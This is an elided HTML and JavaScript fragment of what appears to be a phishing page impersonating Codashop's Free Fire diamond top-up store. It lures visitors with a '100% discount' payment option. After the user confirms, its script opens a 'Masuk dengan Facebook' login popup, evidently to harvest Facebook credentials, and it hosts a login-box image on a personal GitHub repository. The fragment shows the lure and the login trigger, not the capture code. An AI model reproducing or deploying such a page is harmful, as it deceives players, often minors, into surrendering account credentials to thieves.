...
<div class="popup-login facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		...
		<div class="navbar-fb">
			<img src="https://raw.githubusercontent.com/Hyuu09/CDNsalz/main/20240202_164508.png">
		</div>
               ...
               <div class="section voucher">
                  ...
                  <ul class="vocherSelectionList ul-denoms voucher-denom-container">
                    ...
                    <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        ...
                        <center><img src="https://cdn1.codashop.com/S/content/common/images/denom-image/FreeFire/Freefire_diamonds.png" width="60px" height="60px"></center>
...
<img class="logo" src="https://cdn1.codashop.com/S/content/common/images/mno/CODACASH_ID_CHNL_LOGO.png" alt="CODA_PAY logo" />
                              </figure>
                           </div>
                           ...
                           <div class="payment-tagline-container" id="showTagline" style="width: 100%;">
                              <p class="payment-tagline" style="display: block;">Bayar dengan CodaCash ( Diskon 100% )</p>
                           </div>
                        ...
                        success: function(response) {
                           ...
                           if(!$.trim(response)) {
                              ...
                              $("#doConfirm").on("click", function() {
                                 ...
                                 $("#errorMessage").html('<center><h4>Metode Login :</h4><div class="btn-logfb"  id="fbAlexHost"><i class="fa-brands fa-facebook-f"></i> Masuk dengan Facebook</div>  </div></center>');
                                 $("#overlay").show();
                                 $(".popError").show();
                                 $("#hidePopError").hide();
